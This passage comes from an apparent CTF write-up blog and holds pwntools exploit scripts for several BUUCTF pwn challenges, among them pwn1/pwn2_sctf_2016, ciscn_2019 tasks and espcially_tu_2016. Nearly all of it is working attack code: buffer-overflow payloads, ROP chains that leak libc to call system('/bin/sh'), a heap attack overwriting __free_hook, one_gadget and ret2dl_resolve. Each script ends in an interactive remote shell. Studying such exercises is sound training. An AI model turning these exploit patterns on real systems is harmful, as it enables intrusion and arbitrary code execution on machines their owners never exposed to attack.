lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	one_gadget &#x3D; libc + 0xf1147</span><br><span class="line">	sh.sendline(str(one_gadget))</span><br><span class="line">	log.success(&quot;__libc_start_main: &quot; + hex(__libc_start_main))</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;one_gadget: &quot; + hex(one_gadget))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20082,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x12-pwn1-sctf-2016">0x12 pwn1_sctf_2016</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;pwn1_sctf_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;pwn1_sctf_2016&quot;)</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line"></span><br><span class="line">	payload &#x3D; &quot;I&quot; * 19 + &quot;a&quot; * 7 + p32(0x08048F0D)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20086,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x13-pwn2-sctf-2016">0x13 pwn2_sctf_2016</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;pwn2_sctf_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;pwn2_sctf_2016&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc-2.23.so&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;x86_libc.so.6&quot;)</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline(&quot;-1&quot;)</span><br><span class="line">	offset &#x3D; 48</span><br><span class="line">	start_addr &#x3D; 0x080483D0</span><br><span class="line">	payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p32(elf.plt[&#39;printf&#39;])</span><br><span class="line">	payload +&#x3D; p32(start_addr)</span><br><span class="line">	payload +&#x3D; p32(0x080486F8)</span><br><span class="line">	payload +&#x3D; p32(elf.got[&#39;__libc_start_main&#39;])</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline(flat(payload))</span><br><span class="line">	sh.recvuntil(&quot;You said: &quot;)</span><br><span class="line">	sh.recvuntil(&quot;You said: &quot;)</span><br><span class="line">	__libc_start_main &#x3D; u32(sh.recv(4))</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	system_addr &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc + lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	sh.sendline(&quot;-1&quot;)</span><br><span class="line">	payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p32(system_addr)</span><br><span class="line">	payload +&#x3D; p32(0x080486F8)</span><br><span class="line">	payload +&#x3D; p32(binsh)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	log.success(&quot;libc:&quot; + hex(libc))</span><br><span class="line">	log.success(&quot;system_addr:&quot; + hex(system_addr))</span><br><span class="line">	log.success(&quot;binsh:&quot; + hex(binsh))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20087,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x14-ciscn-2019-c-1">0x14 ciscn_2019_c_1</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_c_1&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_c_1&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x64_libc.so.6&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Input your choice!&quot;)</span><br><span class="line">	pop3_ret &#x3D; 0x0000000000400c7f</span><br><span class="line">	pop_rdi_ret &#x3D; 0x0000000000400c83</span><br><span class="line">	pop_rsi_r15_ret &#x3D; 0x0000000000400c81</span><br><span class="line">	payload  &#x3D; &#39;\x00&#39; * (0x50 + 0x8)</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret) + p64(elf.got[&#39;__libc_start_main&#39;]) + p64(elf.plt[&#39;puts&#39;]) + p64(elf.symbols[&#39;main&#39;])</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Input your Plaintext to be encrypted\n&quot;)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.recvuntil(&quot;Ciphertext\n\n&quot;)</span><br><span class="line">	libc &#x3D; u64(sh.recvuntil(&quot;\n&quot;,True).ljust(8,&quot;\x00&quot;)) - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc+ lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Input your Plaintext to be encrypted\n&quot;)</span><br><span class="line">	payload  &#x3D; &quot;\x00&quot; * (0x50 + 0x8)</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">	log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20115,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x15-ciscn-2019-n-1">0x15 ciscn_2019_n_1</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from time import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_n_1&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_n_1&quot;)</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	pop_rdi_ret &#x3D; 0x400793</span><br><span class="line">	offset &#x3D; 56</span><br><span class="line">	payload  &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret) + p64(elf.bss()) + p64(elf.plt[&#39;gets&#39;])</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret) + p64(elf.bss()) + p64(elf.plt[&#39;system&#39;])</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20137,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x16-ciscn-2019-n-8">0x16 ciscn_2019_n_8</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_n_8&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_n_8&quot;)</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	sh.recv()</span><br><span class="line">	payload &#x3D; &quot;\x11&quot; * 0x35</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20144,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x17-ciscn-2019-sw-7">0x17 ciscn_2019_sw_7</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_sw_7&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;The size of note:&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;The content of note:&quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;4&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def add_str(size,content):</span><br><span class="line">        sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">        sh.sendline(&quot;1&quot;)</span><br><span class="line">        sh.recvuntil(&quot;The size of note:&quot;)</span><br><span class="line">        sh.sendline(size)</span><br><span class="line">        sh.recvuntil(&quot;The content of note:&quot;)</span><br><span class="line">        sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_sw_7&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">		main_arena_offset &#x3D; 0x7fc161d75b20 - 0x7fc1619b1000</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x64_libc.so.6&quot;)</span><br><span class="line">		main_arena_offset &#x3D; 0x3C4B20</span><br><span class="line">	add(0x10,&quot;\x11&quot; * 0xF + &quot;\n&quot;)</span><br><span class="line">	add(0x10,&quot;\x22&quot; * 0xF + &quot;\n&quot;)</span><br><span class="line">	add(0x60,&quot;\x33&quot; * 0xF + &quot;\n&quot;)</span><br><span class="line">	add(0x60,&quot;\x77&quot; * 0x5F + &quot;\n&quot;)</span><br><span class="line">	add(0x10,&quot;\x44&quot; * 0xF + &quot;\n&quot;)</span><br><span class="line">	free(0)</span><br><span class="line">	payload  &#x3D; p64(0) * 2</span><br><span class="line">	payload +&#x3D; p64(0x91) + p64(0x10) + p64(0) * 2 + p64(0x71) + p64(0x60)</span><br><span class="line">	add_str(&quot;-1&quot;,payload + &quot;\n&quot;)</span><br><span class="line">	free(1)</span><br><span class="line">	add(0x10,&quot;\x55&quot; * 0xF + &quot;\n&quot;)</span><br><span class="line">	show(2)</span><br><span class="line">	sh.recvuntil(&quot;2 : &quot;)</span><br><span class="line">	main_arena &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;).ljust(8,&quot;\x00&quot;)) - 88</span><br><span class="line">	libc &#x3D; main_arena - main_arena_offset</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	__free_hook &#x3D; libc + 0x3C67A8</span><br><span class="line">	free(0)</span><br><span class="line">	payload &#x3D; p64(0) * 2 + p64(0x21) + p64(0x10) + p64(0) * 2 + p64(0x71) + p64(main_arena + 88) + p64(__free_hook - 0x40) + &quot;\n&quot;</span><br><span class="line">	add_str(&quot;-1&quot;,payload)</span><br><span class="line">	add(0x60,&quot;\x66&quot; * 0x5F + &quot;\n&quot;)</span><br><span class="line">	free(0)</span><br><span class="line">	free(3)</span><br><span class="line">	payload  &#x3D; p64(0)*2 + p64(0x21) + p64(0x10) + p64(0)*2 + p64(0x71) + p64(0x60) + p64(0) * 12 + p64(0x71) + p64(__free_hook - 0x33)</span><br><span class="line">	payload +&#x3D; p64(0) * 12 + p64(0x21) + &quot;&#x2F;bin&#x2F;sh\x00\n&quot;</span><br><span class="line">	add_str(&quot;-1&quot;,payload)</span><br><span class="line">	add(0x60,&quot;aaaa\n&quot;)</span><br><span class="line">	payload &#x3D; &#39;\x7f\x00\x00&#39; + p64(0) * 3 + p64(system) + &quot;\n&quot;</span><br><span class="line">	add(0x60,payload)</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;main_arena: &quot; + hex(main_arena))</span><br><span class="line">	log.success(&quot;__free_hook: &quot; + hex(__free_hook))</span><br><span class="line">	log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">	#input()</span><br><span class="line">	free(4)</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	#x&#x2F;50gx (long long)(&amp;main_arena)</span><br><span class="line">	#x&#x2F;50gx (long long)(&amp;__free_hook) - 0x50</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20134,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x18-espcially-tu-2016">0x18 espcially_tu_2016</h2>
<h3 id="解法一">解法一:</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;espcially_tu_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;espcially_tu_2016&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x86_libc.so.6&quot;)</span><br><span class="line">	pop_ebp_ret &#x3D; 0x0804864f</span><br><span class="line">	pop_ebx_esi_edi_ebp_ret &#x3D; 0x0804864C</span><br><span class="line">	pop3_ret &#x3D; 0x0804864d</span><br><span class="line">	gets_plt &#x3D; 0x080483D0</span><br><span class="line">	offset &#x3D; 44</span><br><span class="line">	payload  &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p32(elf.plt[&#39;puts&#39;]) + p32(pop_ebp_ret) + p32(elf.got[&#39;__libc_start_main&#39;])</span><br><span class="line">	payload +&#x3D; p32(gets_plt) + p32(pop_ebp_ret) + p32(elf.got[&quot;printf&quot;])</span><br><span class="line">	payload +&#x3D; p32(gets_plt) + p32(pop_ebp_ret) + p32(elf.got[&#39;printf&#39;])</span><br><span class="line">	payload +&#x3D; p32(gets_plt) + p32(pop_ebp_ret) + p32(elf.bss())</span><br><span class="line">	payload +&#x3D; p32(elf.plt[&#39;printf&#39;]) + p32(0xdeadbeef) + p32(elf.bss())</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;number!\n&quot;)</span><br><span class="line">	__libc_start_main &#x3D; u32(sh.recv(4))</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc + lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(p32(system))</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line">	payload  &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p32(system) + p32(0xdeadbeef) + p32(binsh)</span><br><span class="line">	#sh.sendline(payload)</span><br><span class="line">	#sh.recv()</span><br><span class="line">	#sh.sendline(&quot;1&quot;)</span><br><span class="line">	log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">	log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">	log.success(&quot;__libc_start_main: &quot; + hex(__libc_start_main))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20071,1)</span><br></pre></td></tr></table></figure>
<h3 id="解法二">解法二:</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from time import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">from pwn import remote</span><br><span class="line">#r &#x3D; process(&#39;.&#x2F;espcially_tu_2016&#39;)</span><br><span class="line">r &#x3D; remote(&quot;buuoj.cn&quot;,20071)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">rop &#x3D; ROP(&#39;.&#x2F;espcially_tu_2016&#39;)</span><br><span class="line">offset &#x3D; 44</span><br><span class="line">bss_base &#x3D; rop.section(&#39;.bss&#39;) + 0x800</span><br><span class="line">buf &#x3D; rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf +&#x3D; rop.call(&#39;gets&#39;, bss_base)</span><br><span class="line">buf +&#x3D; rop.call(&#39;gets&#39;, bss_base)</span><br><span class="line"># used to call dl_Resolve()</span><br><span class="line">buf +&#x3D; rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.sendline(buf)</span><br><span class="line">sleep(0.2)</span><br><span class="line">r.sendline(&quot;1&quot;)</span><br><span class="line">buf &#x3D; rop.string(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">buf +&#x3D; rop.fill(20, buf)</span><br><span class="line"># used to make faking data, such relocation, Symbol, Str</span><br><span class="line">buf +&#x3D; rop.dl_resolve_data(bss_base + 20, &#39;system&#39;)</span><br><span class="line">buf +&#x3D; rop.fill(100, buf)</span><br><span class="line">sleep(0.2)</span><br><span class="line">r.sendline(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x19-ciscn-2019-en-2">0x19 ciscn_2019_en_2</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td 